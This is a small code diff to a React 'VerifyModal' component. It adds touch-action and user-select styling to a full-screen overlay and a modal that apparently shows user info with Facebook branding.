@@ -121,8 +121,8 @@ const VerifyModal: FC<{ nextStep: () => void; businessName?: string; fullName?: 
     return (
         <>
             {/* Overlay mờ toàn màn hình */}
-            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
-            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6 overflow-hidden'>
+            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all" style={{touchAction: 'manipulation'}}></div>
+            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6 overflow-hidden select-none' style={{touchAction: 'manipulation', userSelect: 'none'}}>
                 <div className='flex max-h-[95vh] w-full max-w-[340px] sm:max-w-sm md:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-3 sm:p-4 md:p-5 overflow-hidden'>
                     {/* Header with user info and Facebook branding */}
                     <div className='pb-2 sm:pb-3 md:pb-4 mb-1'>
